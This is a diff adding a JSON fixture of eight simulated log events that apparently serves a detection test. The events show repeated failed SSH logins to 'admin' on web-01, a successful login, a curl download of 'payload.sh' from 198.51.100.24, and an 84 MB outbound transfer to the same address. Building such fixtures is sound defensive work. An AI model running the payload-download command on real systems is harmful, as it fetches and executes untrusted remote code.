@@ -1,0 +1,11 @@
+[
+  {"id":"evt-001","timestamp":"2026-09-16T12:01:00Z","source":"auth","action":"login_failed","username":"admin","source_ip":"10.2.4.18","hostname":"web-01","raw":"Failed SSH login for admin from 10.2.4.18"},
+  {"id":"evt-002","timestamp":"2026-09-16T12:01:08Z","source":"auth","action":"login_failed","username":"admin","source_ip":"10.2.4.18","hostname":"web-01","raw":"Failed SSH login for admin from 10.2.4.18"},
+  {"id":"evt-003","timestamp":"2026-09-16T12:01:16Z","source":"auth","action":"login_failed","username":"admin","source_ip":"10.2.4.18","hostname":"web-01","raw":"Failed SSH login for admin from 10.2.4.18"},
+  {"id":"evt-004","timestamp":"2026-09-16T12:01:24Z","source":"auth","action":"login_failed","username":"admin","source_ip":"10.2.4.18","hostname":"web-01","raw":"Failed SSH login for admin from 10.2.4.18"},
+  {"id":"evt-005","timestamp":"2026-09-16T12:01:32Z","source":"auth","action":"login_failed","username":"admin","source_ip":"10.2.4.18","hostname":"web-01","raw":"Failed SSH login for admin from 10.2.4.18"},
+  {"id":"evt-006","timestamp":"2026-09-16T12:03:00Z","source":"auth","action":"login_success","username":"admin","source_ip":"10.2.4.18","hostname":"web-01","raw":"Successful SSH login for admin from 10.2.4.18"},
+  {"id":"evt-007","timestamp":"2026-09-16T12:04:00Z","source":"process","process_name":"curl","command_line":"curl -fsSL https://198.51.100.24/payload.sh","username":"admin","hostname":"web-01","raw":"New process curl on web-01"},
+  {"id":"evt-008","timestamp":"2026-09-16T12:07:00Z","source":"network","source_ip":"10.0.0.5","destination_ip":"198.51.100.24","hostname":"web-01","bytes_sent":88080384,"demo_destination":true,"raw":"84 MB outbound transfer from web-01"}
+]
+
